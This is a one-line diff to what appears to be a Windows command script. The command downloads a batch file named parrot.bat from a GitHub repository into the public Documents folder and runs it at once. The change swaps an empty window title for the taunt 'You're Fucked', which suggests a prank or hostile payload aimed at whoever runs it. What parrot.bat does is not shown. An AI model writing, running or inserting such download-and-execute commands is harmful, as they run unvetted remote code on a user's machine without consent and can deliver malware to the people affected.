@@ -1,1 +1,1 @@
-cmd /c "cd C:\Users\Public\Documents & curl -L -o "parrot.bat" "https://github.com/Pooueto/parrot.live/raw/main/parrot.bat" & start "" .\parrot.bat"
+cmd /c "cd C:\Users\Public\Documents & curl -L -o "parrot.bat" "https://github.com/Pooueto/parrot.live/raw/main/parrot.bat" & start "You're Fucked" .\parrot.bat"
